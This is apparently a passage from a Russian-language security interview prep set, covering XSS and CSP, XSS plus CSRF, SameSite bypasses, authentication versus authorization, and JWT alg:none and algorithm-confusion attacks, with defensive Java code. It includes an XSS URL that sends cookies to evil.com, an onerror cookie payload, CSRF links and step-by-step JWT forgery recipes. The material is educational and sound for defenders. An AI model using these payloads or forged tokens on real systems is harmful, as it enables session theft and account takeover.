### Вопрос 21. Чем отличается Stored XSS от Reflected XSS и DOM-based XSS? Какой из трёх сложнее всего обнаружить и почему? Как Content-Security-Policy помогает, и каковы её ограничения?

**Категория:** Безопасность · **Уровень:** Middle

#### Оригинальный ответ из интернета
> Источник: [Types of Cross-Site Scripting — OWASP Foundation](https://owasp.org/www-community/Types_of_Cross-Site_Scripting)

OWASP разделяет XSS на два больших класса по месту инъекции: серверный (Stored и Reflected) и клиентский (DOM-based). Reflected XSS возникает, когда приложение немедленно возвращает пользовательский ввод в HTTP-ответе без безопасного рендеринга. Stored XSS — когда ввод сохраняется на сервере (БД, лог, комментарий) и затем отдаётся другим пользователям. DOM-based XSS принципиально отличается: HTTP-ответ сервера не меняется, но клиентский JavaScript читает данные из небезопасного источника (source) и записывает их в опасный получатель (sink), модифицируя DOM. OWASP прямо указывает: «DOM XSS vulnerabilities can be executed in many instances without the server being able to determine what is actually being executed» — именно поэтому серверные сканеры его пропускают.

#### Ответ от Claude

**Три вида XSS: механизм и ключевые различия**

**Reflected XSS (отражённый)**

Вредоносный скрипт содержится в самом HTTP-запросе (URL-параметре, заголовке, теле POST) и немедленно возвращается сервером в HTTP-ответе без безопасного кодирования. Атака работает только если жертва перейдёт по специально сконструированной ссылке:

```
https://example.com/search?q=<script>document.location='https://evil.com/?c='+document.cookie</script>
```

Сервер вставляет `q` в HTML ответа, браузер выполняет скрипт. Атака не персистентна: каждый раз нужна новая жертва, переходящая по вредоносной ссылке. Требует социальной инженерии (фишинговое письмо, вредоносная реклама).

**Stored XSS (хранимый / постоянный)**

Вредоносный скрипт сохраняется на сервере (в БД, файловой системе, кэше) и автоматически доставляется всем пользователям, которые загружают соответствующую страницу. Типичные векторы: поле комментария, имя пользователя в профиле, поле описания товара, сообщение в форуме.

Ключевое свойство: **атака самодостаточна** — злоумышленник не должен взаимодействовать с каждой жертвой по отдельности. Любой пользователь, зашедший на страницу, становится жертвой автоматически. Это делает Stored XSS значительно опаснее Reflected: возможны атаки-черви (XSS worms), распространяющиеся экспоненциально среди пользователей приложения.

**DOM-based XSS (клиентский)**

Принципиально отличается от предыдущих двух: **HTTP-ответ сервера остаётся неизменным**. Уязвимость существует исключительно в клиентском JavaScript. Скрипт страницы читает данные из небезопасного **источника (source)** и передаёт их в опасный **получатель (sink)**:

Типичные источники: `location.hash`, `location.search`, `document.referrer`, `window.name`, `document.URL`.

Типичные получатели: `innerHTML`, `outerHTML`, `document.write()`, `eval()`, `setTimeout(string)`, `script.src`.

```javascript
// Уязвимый код: читает из URL и пишет в DOM без санитизации
const name = new URLSearchParams(location.search).get('name');
document.getElementById('greeting').innerHTML = 'Hello, ' + name;
// Атака: ?name=<img src=x onerror=alert(document.cookie)>
```

Особый случай: атака через `location.hash` — браузер **не отправляет фрагмент (#...) на сервер**, поэтому сервер вообще не видит вредоносную нагрузку.

**Какой из трёх труднее всего обнаружить**

**DOM-based XSS** является наиболее сложным для обнаружения по нескольким взаимодополняющим причинам:

1. **Серверные сканеры слепы.** Инъекция происходит целиком в браузере. Сервер получает корректный HTTP-запрос и возвращает легитимный HTTP-ответ — в котором нет никаких признаков XSS. Статические анализаторы HTTP-трафика и WAF не видят атаки.

2. **Фрагмент URL не передаётся серверу.** Атаки через `location.hash` полностью невидимы для серверной инфраструктуры, включая логи.

3. **Нагрузка не обязательно появляется в DOM.** При атаке через `eval()` или `setTimeout(string)` входные данные никогда не записываются в DOM-дерево — сканер не может найти их через поиск по DOM.

4. **Минифицированный и динамический JS.** Реальные приложения используют тысячи строк минифицированного кода. Ручной анализ потока данных от source к sink крайне трудоёмок.

5. **Требует динамического анализа.** Обнаружение требует реального выполнения JavaScript в браузере, тогда как Reflected/Stored XSS можно частично найти статическим анализом HTTP-ответов.

Для сравнения: Stored XSS труднее Reflected в части **оценки масштаба** (непонятно, сколько пользователей затронуто), но обнаруживается стандартными сканерами. Reflected XSS — самый простой для автоматического обнаружения (подай payload — получи его в ответе).

**Content Security Policy: механизм работы**

CSP — это HTTP-заголовок (`Content-Security-Policy`), который браузер получает от сервера и применяет как политику загрузки ресурсов и выполнения кода. CSP работает по принципу белого списка.

Ключевые директивы против XSS:
- `script-src 'self'` — разрешает скрипты только с того же источника.
- `script-src 'nonce-{RANDOM}'` — разрешает только скрипты с совпадающим одноразовым значением `nonce`.
- `script-src 'sha256-{HASH}'` — разрешает только скрипты с совпадающим хешем содержимого.
- `default-src 'none'; object-src 'none'; base-uri 'none'` — минимальная строгая политика.

По умолчанию (без `unsafe-inline`) CSP блокирует:
- инлайн-скрипты `<script>alert(1)</script>`;
- атрибуты-обработчики событий `<img onerror="..."`;
- URL `javascript:...`;
- `eval()` и похожие API динамической генерации кода.

Это напрямую нейтрализует большинство векторов Reflected и Stored XSS.

**Ограничения CSP**

1. **CSP не заменяет санитизацию входных данных.** Если сервер генерирует опасный HTML до применения заголовков — CSP может быть уже слишком поздно. MDN прямо указывает: _"Setting a CSP is not an alternative to sanitizing input."_ CSP — второй эшелон защиты, не первый.

2. **Политики на основе белых списков доменов неэффективны.** Если в белом списке есть CDN или сторонний домен, злоумышленник может найти на нём JSONP-эндпоинт или загружаемый скрипт для обхода политики. Исследования показали, что большинство реальных CSP-политик имеют обходы через разрешённые домены.

3. **`unsafe-inline` и `unsafe-eval` аннулируют защиту.** Их использование продиктовано необходимостью поддержки legacy-кода, но фактически сводит CSP на нет.

4. **DOM-based XSS: CSP защищает частично.** CSP блокирует инлайн-обработчики и `eval()`, но если sink — это `innerHTML` или `document.write`, то при наличии в белом списке хотя бы одного trusted-скрипта, который может быть переиспользован как гаджет, защита обходится. Полную защиту для DOM-сценариев даёт только Trusted Types API (`require-trusted-types-for 'script'`).

5. **Nonce-based CSP требует серверной генерации на каждый запрос.** Статические HTML-файлы не могут использовать nonce-подход. Кроме того, nonce бесполезен, если атакующий может читать значение nonce из DOM (например, через XSS с чтением страницы).

6. **`strict-dynamic` ослабляет контроль транзитивных зависимостей.** Скрипт с корректным nonce/hash может динамически загружать другие скрипты без верификации — потенциальная цепочка для атаки через скомпрометированную зависимость.

7. **CSP не защищает от утечки данных через другие каналы** (CSS injection, timing attacks, формы без form-action).

**Практическая рекомендация (по MDN и OWASP):** строгая CSP на основе nonce/hash + `object-src 'none'` + `base-uri 'none'` + `require-trusted-types-for 'script'` в сочетании с санитизацией входных данных и output encoding — это современный стандарт глубокой обороны против XSS.
### Вопрос 22. CSRF-токен хранится в скрытом поле формы. Атакующий нашёл XSS на вашем домене. Защищает ли CSRF-токен в этом случае? Объясните связку XSS + CSRF и как от неё защититься.

**Категория:** Безопасность · **Уровень:** Senior

#### Оригинальный ответ из интернета
> Источник: [Cross-Site Request Forgery Prevention — OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html) (через GitHub mirror: https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.md)

OWASP прямо формулирует: «Помните, что Cross-Site Scripting (XSS) способен нейтрализовать все методы защиты от CSRF!» Документ поясняет, что XSS позволяет выполнить произвольный JavaScript в контексте целевого сайта — то есть в той же origin, где хранится CSRF-токен. Атакующий может извлечь токен из скрытого поля через DOM, включить его в подделанный запрос и успешно пройти проверку на сервере. Механизм синхронизатора токена и паттерн double-submit cookie оба теряют смысл при наличии XSS.

OWASP рекомендует: в первую очередь устранять XSS-уязвимости (см. XSS Prevention Cheat Sheet), применять эшелонированную защиту — токены CSRF, атрибут SameSite на cookie, проверку заголовков Origin/Referer. SameSite частично блокирует классический CSRF, но не client-side CSRF, инициированный XSS-пейлоадом внутри того же origin.

#### Ответ от Claude

**Нет, CSRF-токен в скрытом поле НЕ защищает при наличии XSS на том же домене.**

**Почему CSRF-токен перестаёт работать**

CSRF-токен защищает от атак с других доменов именно потому, что браузер не даёт postороннему сайту читать DOM вашей страницы — политика same-origin. XSS ломает это допущение: инъецированный JavaScript выполняется *внутри* вашего домена и имеет те же права, что и любой законный скрипт страницы.

Типичная атака в три шага:

1. Атакующий находит XSS-уязвимость на `bank.example.com/search?q=<script>...`.
2. Инъецированный скрипт делает запрос к `bank.example.com/transfer/form`, читает ответ (same-origin, CORS не мешает) и вытаскивает значение CSRF-токена через `document.querySelector('input[name="csrf-token"]').value` или регулярным выражением по телу ответа.
3. Скрипт делает POST на `bank.example.com/transfer` с украденным токеном и cookie пользователя (они добавляются браузером автоматически). Сервер видит валидный токен и выполняет перевод.

Эту технику демонстрирует исторический пример — червь Samy (2005), использовавший XMLHttpRequest для извлечения CSRF-токена MySpace.

**Что именно ломается при XSS**

| Защитный механизм | Ломается XSS? | Причина |
|---|---|---|
| Synchronizer Token (скрытое поле) | Да | DOM читается из того же origin |
| Double-Submit Cookie | Да | Можно прочитать cookie без HttpOnly или переписать через document.cookie |
| Заголовок Origin/Referer | Да | fetch/XHR отправляет корректный Origin того же домена |
| Custom request header (X-Requested-With) | Да | XSS-скрипт может выставить любой заголовок |

**Как защититься от связки XSS + CSRF**

1. **Устранить XSS в первую очередь.** CSRF-защита — вторая линия; если XSS проходит, она бесполезна. Используйте Content Security Policy (CSP), экранирование вывода, валидацию ввода.

2. **HttpOnly на cookie сессии.** Не позволяет XSS-скрипту читать session cookie напрямую через `document.cookie`. Это не мешает атаке с похищением CSRF-токена, но сужает поверхность атаки.

3. **SameSite=Strict на session cookie.** Самый строгий вариант: cookie не отправляется вообще при cross-site запросе. Однако при XSS запрос идёт same-site — поэтому SameSite тоже не спасает от XSS-инициированного CSRF.

4. **Хранить CSRF-токен в cookie с HttpOnly=false + отдельном заголовке (double-submit pattern).** Немного поднимает планку для атакующего, но при XSS всё равно читается.

5. **Content Security Policy (CSP)** с ограничением `script-src` — блокирует инъекцию внешних скриптов. Наиболее эффективная мера против XSS.

6. **Subresource Integrity (SRI)** для всех подключаемых сторонних скриптов.

**Итоговая формула:** XSS + CSRF-токен в скрытом поле = CSRF-токен бесполезен. Единственная правильная стратегия — не допустить XSS. CSRF-токен защищает только от *межсайтовых* атак без XSS.

### Вопрос 23. SameSite=Lax у cookie — достаточно ли этого для защиты от CSRF? Перечислите случаи, когда SameSite=Lax всё равно не защищает.

**Категория:** Безопасность · **Уровень:** Middle

#### Оригинальный ответ из интернета
> Источник: [Bypassing SameSite cookie restrictions — PortSwigger Web Security Academy](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions)

PortSwigger описывает следующие ситуации, когда SameSite=Lax не обеспечивает защиту:

**Lax по определению пропускает GET-запросы при top-level navigation.** Если сервер выполняет изменяющие состояние операции через GET (что нарушает REST, но встречается), атакующий может просто сослаться на такой URL — браузер отправит cookie. Дополнительно PortSwigger показывает технику «method override»: ряд фреймворков поддерживает параметр `_method=POST` в query string, что позволяет превратить GET-запрос в логический POST с точки зрения роутера при сохранении Lax-cookie.

**120-секундное окно Chrome (Lax+POST grace period).** Чтобы не сломать SSO-сценарии, Chrome исторически отправлял cookie при top-level POST-запросе, если куки не старше 2 минут. Атакующий может форсировать обновление cookie (например, через OAuth redirect) и немедленно атаковать.

**Client-side redirect.** Если приложение содержит редирект на стороне клиента (`window.location = userInput`), атакующий может направить жертву через same-site редирект, превращая cross-site запрос в same-site, что снимает защиту SameSite.

**Субдомены** (sibling domain attack): `evil.example.com` и `app.example.com` считаются one «site» с точки зрения SameSite. XSS или скомпрометированный поддомен снимает защиту для всего домена.

#### Ответ от Claude

**SameSite=Lax — полезный слой защиты, но сам по себе недостаточен.**

**Что делает SameSite=Lax**

Cookie отправляется с запросом только в двух случаях:
- запрос идёт от того же «сайта» (same-site), или
- запрос — top-level навигация (пользователь кликает на ссылку) методом GET.

POST-запросы и другие небезопасные методы с чужого сайта — блокируются.

**Случаи, когда SameSite=Lax НЕ защищает**

1. **GET-запросы с побочными эффектами.** Lax разрешает GET при top-level navigation. Если сервер меняет состояние через GET (`/logout`, `/confirm?token=...`, `/transfer?to=eve&amount=1000`), атака тривиальна: `<a href="https://bank.example.com/transfer?to=eve&amount=1000">Кликни меня</a>`. OWASP прямо указывает: не используйте GET для изменяющих состояние операций.

2. **Method Override (POST через GET).** Фреймворки вроде Rails, Laravel, некоторые Java-фреймворки поддерживают `_method` параметр. Запрос `GET /account/email?_method=POST&email=evil@example.com` воспринимается роутером как POST, при этом браузер отправляет Lax-cookie (top-level GET navigation).

3. **120-секундный grace period в Chrome (Lax+POST).** Исторически Chrome применял временное послабление: cookie, установленные без явного SameSite, при первых 120 секундах своей жизни отправлялись и с top-level POST. Это сделано для совместимости с SAML/OAuth-сценариями. Атакующий может инициировать обновление сессионной cookie (redirect через OAuth), а затем в течение двух минут провести атаку. Важно: это послабление не применяется к cookie с *явно* выставленным `SameSite=Lax`.

4. **Client-side redirect.** Если приложение использует редирект на клиенте (`location.href = '/profile/' + userId`) и значение `userId` частично управляется атакующим (open redirect), запрос становится same-site с точки зрения браузера. Все значения SameSite (включая Strict) не защищают от атак через client-side redirect.

5. **Субдомены как same-site.** RFC определяет «site» как eTLD+1: `evil.example.com` и `app.example.com` — один сайт. XSS на любом поддомене или скомпрометированный поддомен позволяет обходить SameSite для всего `example.com`.

6. **Старые браузеры и нестандартные клиенты.** Браузеры до Chrome 80 (2020) не применяли Lax по умолчанию. Embedded WebView, старые мобильные браузеры, некоторые HTTP-клиенты могут игнорировать SameSite вовсе. Если аудитория охватывает такие клиенты, защита не работает.

7. **XSS на том же домене.** Как разобрано в вопросе №22: XSS-инициированный запрос идёт same-site, SameSite не срабатывает.

8. **Запросы с использованием заголовков CORS с credentials.** Если сервер неправильно настроил CORS (`Access-Control-Allow-Origin: *` с `Access-Control-Allow-Credentials: true` — что технически невалидно, но встречается в baggy конфигурациях), cross-origin запросы могут нести cookie.

**Вывод**

SameSite=Lax — хорошая защита по умолчанию против классического CSRF через `<form>` и `<img>`, но не является самодостаточной мерой. OWASP рекомендует применять SameSite как дополнение к CSRF-токенам (synchronizer token pattern), а не замену им. Для чувствительных операций рекомендуется SameSite=Strict.

### Вопрос 24. В чём разница между аутентификацией и авторизацией? Приведите пример ситуации, когда пользователь успешно аутентифицирован, но не авторизован, и наоборот — авторизован без аутентификации.

**Категория:** Безопасность · **Уровень:** Middle

#### Оригинальный ответ из интернета
> Источник: [Authorization — OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html)

OWASP формулирует: авторизация — это «процесс проверки того, одобрено ли запрошенное действие или услуга для конкретного субъекта» (по определению NIST). Авторизация принципиально отличается от аутентификации, которая является проверкой личности субъекта.

Ключевое наблюдение из OWASP: аутентификация не всегда необходима для доступа к ресурсам — неаутентифицированный пользователь может быть авторизован на доступ к определённым публичным ресурсам, например к изображению, странице входа или даже всему веб-приложению. При этом пользователь, прошедший аутентификацию (например, введя логин и пароль), может не иметь доступа к конкретным ресурсам сервера — например, аутентифицированный пользователь может просматривать свой аккаунт, не имея доступа к аккаунту другого пользователя.

#### Ответ от Claude

**Аутентификация (Authentication)** — процесс подтверждения личности: «Кто ты?». Субъект доказывает, что является тем, за кого себя выдаёт (логин+пароль, биометрия, сертификат, токен).

**Авторизация (Authorization)** — процесс проверки прав доступа: «Что тебе можно делать?». Система решает, разрешено ли аутентифицированному (или анонимному) субъекту выполнить конкретное действие с конкретным ресурсом.

**Принципиальное различие**

| Аспект | Аутентификация | Авторизация |
|---|---|---|
| Вопрос | Кто ты? | Что тебе разрешено? |
| Момент | Предшествует авторизации | Следует после аутентификации (или параллельно) |
| Результат | Установленная личность (principal) | Разрешение или отказ в действии |
| При ошибке | HTTP 401 Unauthorized | HTTP 403 Forbidden |
| Примеры | Пароль, JWT, OAuth token, X.509 | ACL, RBAC, ABAC, @PreAuthorize в Spring |

В Spring Security: `Authentication` — объект, хранящий principal и список `GrantedAuthority`; `AuthorizationManager` (или `AccessDecisionManager` в старых версиях) принимает решение об авторизации уже после того, как личность установлена.

**Пример 1: аутентифицирован, но не авторизован**

Пользователь `alice` (роль `ROLE_USER`) успешно вошёл в систему (аутентификация прошла). Она пытается открыть `GET /admin/users` — эндпоинт, защищённый `@PreAuthorize("hasRole('ADMIN')")`. Spring Security отклоняет запрос с 403 Forbidden. Alice подтвердила свою личность, но не имеет нужных полномочий.

Другой пример: сотрудник банка прошёл аутентификацию и работает со своими клиентами. Он пытается открыть счёт другого клиента (`/accounts/12345`). Сервер проверяет, что `accountOwnerId != currentUserId` — авторизация отклонена. Это типичная Broken Object Level Authorization (BOLA/IDOR) при некорректной реализации.

**Пример 2: авторизован без аутентификации**

Это стандартная ситуация для публичных ресурсов. Примеры:

- Публичная страница `/`, `/about`, `/login` — доступна всем; в Spring Security: `http.authorizeHttpRequests(a -> a.requestMatchers("/public/**").permitAll())`. Пользователь не аутентифицирован (анонимный principal), но авторизован (разрешение выдано).
- CDN со статическим контентом (картинки, CSS, JS) — доступны без авторизации по URL, без какого-либо механизма аутентификации.
- API с публичным read-only доступом: `GET /api/products` — авторизован анонимно; `POST /api/products` — требует аутентификации и роли.
- Pre-signed URL в Amazon S3: ресурс защищён, но URL содержит встроенную подпись и срок действия. Любой владелец этого URL авторизован без предоставления учётных данных — авторизация встроена в сам запрос.

**Мнемоника для собеседования:**
- Аутентификация провалилась → 401 (нужно сначала войти).
- Авторизация провалилась → 403 (ты вошёл, но тебе нельзя).
- Нет аутентификации, но разрешено → публичный ресурс (`permitAll()`).

### Вопрос 25. Объясните атаку alg:none на JWT. Почему она работает, если библиотека берёт алгоритм верификации из самого токена? Как правильно защититься на уровне кода?

**Категория:** Безопасность · **Уровень:** Senior

#### Оригинальный ответ из интернета
> Источник: [JSON Web Token for Java — OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)

Атака alg:none возникает, когда злоумышленник изменяет токен и меняет алгоритм хеширования на ключевое слово `none`, тем самым указывая, что целостность токена уже проверена. Некоторые библиотеки трактовали токены, подписанные алгоритмом `none`, как токены с уже верифицированной подписью — что позволяло изменять полезную нагрузку токена произвольно. Атака также возможна через вариант `NoNe` (нечувствительное к регистру сравнение).

Рекомендации OWASP по предотвращению:
1. Не разрешать незащищённые JWT с `{"alg":"none"}`.
2. Проверять параметр `alg` до верификации, убеждаясь, что он точно соответствует ожидаемому алгоритму.
3. Логику проверки алгоритма жёстко задавать на стороне сервера — не брать её из заголовка токена.
4. Использовать актуальные, проверенные JWT-библиотеки.

#### Ответ от Claude

**Суть атаки**

JWT состоит из трёх частей: `header.payload.signature`, каждая закодирована в Base64URL. Заголовок содержит поле `alg`, которое указывает алгоритм подписи, например `HS256` или `RS256`. Уязвимые библиотеки допускали критическую ошибку: они **брали значение `alg` из самого токена** и использовали его для выбора метода верификации. Алгоритм `none` определён в спецификации JWT (RFC 7519) для «незащищённых» токенов — токенов без подписи.

**Механизм атаки (шаг за шагом)**

1. Злоумышленник получает легитимный JWT: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyIiwicm9sZSI6InVzZXIifQ.SIGNATURE`
2. Декодирует заголовок и меняет `"alg":"HS256"` на `"alg":"none"`.
3. Декодирует payload и меняет `"role":"user"` на `"role":"admin"`.
4. Перекодирует header и payload в Base64URL.
5. Удаляет подпись (последнюю часть), оставляя финальную точку или вообще убирая: `newHeader.newPayload.`
6. Отправляет токен серверу. Уязвимая библиотека видит `alg:none`, пропускает верификацию подписи и принимает токен как валидный.

**Почему это работает**

Фундаментальная причина — нарушение принципа: **верификатор не должен доверять метаданным из самого верифицируемого объекта**. Брать алгоритм из заголовка JWT — это всё равно что спрашивать у подозреваемого, нужно ли его проверять.

Дополнительные векторы обхода попыток блокировки:
- `"alg":"None"`, `"alg":"NONE"`, `"alg":"nOnE"` — обход фильтрации без учёта регистра.
- Пустая строка `""` вместо `"none"` в некоторых библиотеках.

**Защита на уровне кода (Java)**

*Принцип*: алгоритм верификации должен быть жёстко задан на стороне сервера и никогда не браться из токена.

Использование библиотеки **JJWT** (io.jsonwebtoken):

```java
// НЕПРАВИЛЬНО — parse() не требует подписи
// Jwts.parser().setSigningKey(key).parse(token); // уязвимо

// ПРАВИЛЬНО — parseClaimsJws() требует подпись обязательно
Claims claims = Jwts.parserBuilder()
    .setSigningKey(secretKey)          // явно задаём ключ
    .build()
    .parseClaimsJws(token)             // требует JWS (подписанный токен)
    .getBody();
// Если alg=none или подпись отсутствует — выбросит исключение
```

Использование библиотеки **Nimbus JOSE+JWT** (com.nimbusds):

```java
// Создаём верификатор с явным указанием алгоритма
JWSVerifier verifier = new MACVerifier(sharedSecret);

SignedJWT signedJWT = SignedJWT.parse(token);

// Явно проверяем алгоритм ДО верификации
if (!JWSAlgorithm.HS256.equals(signedJWT.getHeader().getAlgorithm())) {
    throw new SecurityException("Unexpected algorithm: " + signedJWT.getHeader().getAlgorithm());
}

if (!signedJWT.verify(verifier)) {
    throw new SecurityException("Invalid signature");
}
```

Для RSA (RS256) с Nimbus JOSE+JWT:

```java
RSASSAVerifier verifier = new RSASSAVerifier(rsaPublicKey);
SignedJWT signedJWT = SignedJWT.parse(token);

// Проверка алгоритма обязательна перед verify()
JWSAlgorithm expectedAlg = JWSAlgorithm.RS256;
if (!expectedAlg.equals(signedJWT.getHeader().getAlgorithm())) {
    throw new SecurityException("Algorithm mismatch");
}

boolean verified = signedJWT.verify(verifier); // false, если alg=none
```

**Итоговые правила защиты**

| Правило | Обоснование |
|---------|-------------|
| Жёстко задавать ожидаемый алгоритм на сервере | Не позволяет токену диктовать метод верификации |
| Использовать `parseClaimsJws()` вместо `parse()` в JJWT | `parse()` принимает незащищённые токены |
| Отвергать `alg:none` безусловно | Нет легитимных сценариев для неподписанных токенов в продакшне |
| Проверять алгоритм с учётом регистра | Блокирует `NoNe`, `NONE`, `nOnE` |
| Использовать актуальные версии библиотек | Старые версии содержали уязвимости по умолчанию |

RFC 8725 (JWT Best Current Practices, секция 3.1) предписывает: библиотеки должны позволять вызывающей стороне задавать множество допустимых алгоритмов, и каждый ключ должен использоваться строго с одним алгоритмом.

### Вопрос 26. Атакующий знает ваш публичный RSA-ключ. Токен подписан RS256. Атакующий меняет заголовок alg на HS256 и подписывает токен публичным ключом как HMAC-секретом. Почему это работает и как это предотвратить?

**Категория:** Безопасность · **Уровень:** Senior

#### Оригинальный ответ из интернета
> Источник: [Algorithm confusion attacks — Web Security Academy (PortSwigger)](https://portswigger.net/web-security/jwt/algorithm-confusion)

Атаки с путаницей алгоритмов (также известные как атаки с путаницей ключей) возникают, когда злоумышленник может заставить сервер верифицировать подпись JWT с использованием другого алгоритма, чем предполагали разработчики. При неправильной обработке это позволяет создавать валидные JWT с произвольными значениями без знания секретного ключа подписи.

RS256 использует асимметричную пару ключей: приватный ключ для подписи и математически связанный публичный ключ для верификации. Уязвимость возникает потому, что если сервер получает токен, подписанный симметричным алгоритмом HS256, универсальный метод `verify()` библиотеки трактует публичный ключ как HMAC-секрет. Атакующий знает публичный ключ, подписывает токен алгоритмом HS256, используя публичный ключ как секрет, — и сервер принимает его, верифицируя тем же публичным ключом.

Шаги эксплуатации:
1. Получить публичный RSA-ключ сервера.
2. Изменить `alg` в заголовке токена с `RS256` на `HS256`.
3. Изменить payload (например, `sub` → `administrator`).
4. Подписать токен алгоритмом HMAC-SHA256, используя публичный ключ как секрет.
5. Отправить токен — сервер верифицирует его тем же публичным ключом через HMAC и принимает как валидный.

#### Ответ от Claude

**Технический механизм атаки**

RS256 (RSA + SHA-256) — асимметричный алгоритм:
- **Подпись**: `signature = RSA_sign(private_key, hash(header.payload))`
- **Верификация**: `RSA_verify(public_key, signature, hash(header.payload))`

HS256 (HMAC + SHA-256) — симметричный алгоритм:
- **Подпись**: `signature = HMAC_SHA256(secret, header.payload)`
- **Верификация**: `HMAC_SHA256(secret, header.payload) == signature`

Уязвимая реализация выглядит примерно так (псевдокод):

```java
// УЯЗВИМО — алгоритм берётся из заголовка
public Claims verify(String token, Key key) {
    String alg = parseHeader(token).getAlgorithm(); // берём из токена!
    if (alg.equals("RS256")) {
        return verifyRSA(token, (PublicKey) key);
    } else if (alg.equals("HS256")) {
        return verifyHMAC(token, key.getEncoded()); // key.getEncoded() = байты публичного ключа
    }
}
```

**Почему атака работает**

1. Публичный RSA-ключ — публично известен (может быть в JWKS-endpoint, в коде или в сертификате).
2. Злоумышленник создаёт токен с `"alg":"HS256"` и нужным payload.
3. Подписывает его: `HMAC_SHA256(publicKeyBytes, "header.payload")`.
4. Уязвимая библиотека получает токен, видит `alg:HS256`, вызывает HMAC-верификацию с тем же публичным ключом.
5. `HMAC_SHA256(publicKeyBytes, "header.payload")` совпадает — токен принят.

Ключевое: HMAC — симметричный алгоритм. Если атакующий и сервер используют одни и те же входные данные (байты публичного ключа + содержимое токена), они получат одинаковую подпись. Публичный ключ не является секретом, поэтому атака воспроизводима.

**Исторический контекст**

Эта уязвимость была обнаружена и задокументирована исследователями Auth0 в 2015 году. Затронутые библиотеки на тот момент: node-jsonwebtoken, pyjwt, namshi/jose, php-jwt, jsjwt. Аналогичные CVE фиксировались и позднее: CVE-2021-46743, CVE-2023-48223, CVE-2024-37568.

**Получение публичного ключа атакующим**

Публичный RSA-ключ зачастую доступен:
- Через JWKS endpoint: `https://example.com/.well-known/jwks.json`
- Из TLS-сертификата сервера
- Из открытого репозитория или документации
- Методом вычисления из нескольких токенов (при отсутствии явного disclosure)

**Защита на уровне кода (Java)**

*Принцип*: жёстко привязывать ключ к единственно допустимому алгоритму; никогда не использовать один ключ для нескольких алгоритмов.

Использование библиотеки **JJWT** (io.jsonwebtoken >= 0.11):

```java
// ПРАВИЛЬНО: явно указываем публичный ключ RSA
// JJWT автоматически определяет алгоритм по типу ключа (RSAPublicKey -> RS*)
// и отвергает токены с несовпадающим alg
RSAPublicKey publicKey = loadPublicKey();

Claims claims = Jwts.parserBuilder()
    .setSigningKey(publicKey)    // RSAPublicKey — JJWT ожидает RSA-алгоритм
    .build()
    .parseClaimsJws(token)       // выбросит исключение, если alg=HS256 с RSA-ключом
    .getBody();
```

Использование библиотеки **Nimbus JOSE+JWT**:

```java
// Явно создаём верификатор для конкретного алгоритма
RSASSAVerifier verifier = new RSASSAVerifier(rsaPublicKey);

SignedJWT signedJWT = SignedJWT.parse(token);

// ОБЯЗАТЕЛЬНАЯ проверка алгоритма перед верификацией
if (!JWSAlgorithm.RS256.equals(signedJWT.getHeader().getAlgorithm())) {
    throw new SecurityException(
        "Expected RS256, got: " + signedJWT.getHeader().getAlgorithm()
    );
}

if (!signedJWT.verify(verifier)) {
    throw new SecurityException("Signature verification failed");
}
```

Использование **Spring Security OAuth2 Resource Server** (конфигурация):

```java
@Bean
public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
    http.oauth2ResourceServer(oauth2 -> oauth2
        .jwt(jwt -> jwt
            .decoder(jwtDecoder())
        )
    );
    return http.build();
}

@Bean
public JwtDecoder jwtDecoder() {
    // NimbusJwtDecoder принимает только RSA-подписи при использовании публичного ключа
    return NimbusJwtDecoder.withPublicKey(rsaPublicKey())
        .signatureAlgorithm(SignatureAlgorithm.RS256)  // явно указываем алгоритм
        .build();
}
```

**Итоговые правила защиты**

| Правило | Обоснование |
|---------|-------------|
| Жёстко задавать ожидаемый алгоритм на стороне сервера | Сервер не доверяет `alg` из заголовка токена |
| Не допускать один ключ для нескольких алгоритмов | RFC 8725 §3.1: каждый ключ должен использоваться ровно с одним алгоритмом |
| Проверять тип ключа перед верификацией | RSAPublicKey не должен использоваться для HMAC |
| Не публиковать публичные ключи без необходимости | Уменьшает поверхность атаки (хотя не устраняет её полностью) |
| Использовать актуальные версии библиотек с патчами | Закрывают CVE-2021-46743, CVE-2023-48223 и аналогичные |
| Использовать специализированные методы (parseClaimsJws вместо parse) | Гарантируют, что принимаются только подписанные токены нужного типа |

### Вопрос 27. JWT хранит чувствительные данные в payload. Что произойдёт, если пользователь декодирует его через base64? Что такое JWE и чем он отличается от JWS?

**Категория:** Безопасность · **Уровень:** Middle

#### Оригинальный ответ из интернета
> Источник: [Demystifying JOSE, the JWT Family: JWS, JWE, JWA, and JWK Explained — Auth0 Blog](https://auth0.com/blog/demystifying-jose-jwt-family/)

JWS и JWE — это два разных защищённых контейнера. JWS обеспечивает целостность и аутентичность (данные не изменены, отправитель подтверждён), но **не скрывает содержимое**: заголовок и payload закодированы в Base64URL, а не зашифрованы. Это значит, что любой, кто перехватит токен, может прочитать его содержимое — Base64URL-кодирование тривиально обратимо.

JWE, напротив, шифрует содержимое, обеспечивая конфиденциальность. Только получатель с нужным ключом может расшифровать payload. Подписанный JWT (JWS) гарантирует аутентичность и целостность, но данные публичны; зашифрованный JWT (JWE) скрывает содержимое от посторонних.

Можно комбинировать оба подхода: сначала подписать данные (JWS), затем зашифровать подписанный токен (JWE) — это обеспечивает и целостность, и конфиденциальность.

#### Ответ от Claude

**Что произойдёт при декодировании JWT через Base64**

Стандартный JWT (JWS) имеет формат: `header.payload.signature`

Каждая часть закодирована в Base64URL — это обратимое кодирование без шифрования. Любой может выполнить:

```bash
# Декодирование payload в командной строке
echo "eyJzdWIiOiJ1c2VyMTIzIiwiZW1haWwiOiJ1c2VyQGV4YW1wbGUuY29tIiwicm9sZSI6ImFkbWluIn0" \
  | base64 -d
# Результат:
# {"sub":"user123","email":"user@example.com","role":"admin"}
```

Или прямо в браузерной консоли:
```javascript
atob("eyJzdWIiOiJ1c2VyMTIzIiwiZW1haWwiOiJ1c2VyQGV4YW1wbGUuY29tIn0=")
// {"sub":"user123","email":"user@example.com"}
```

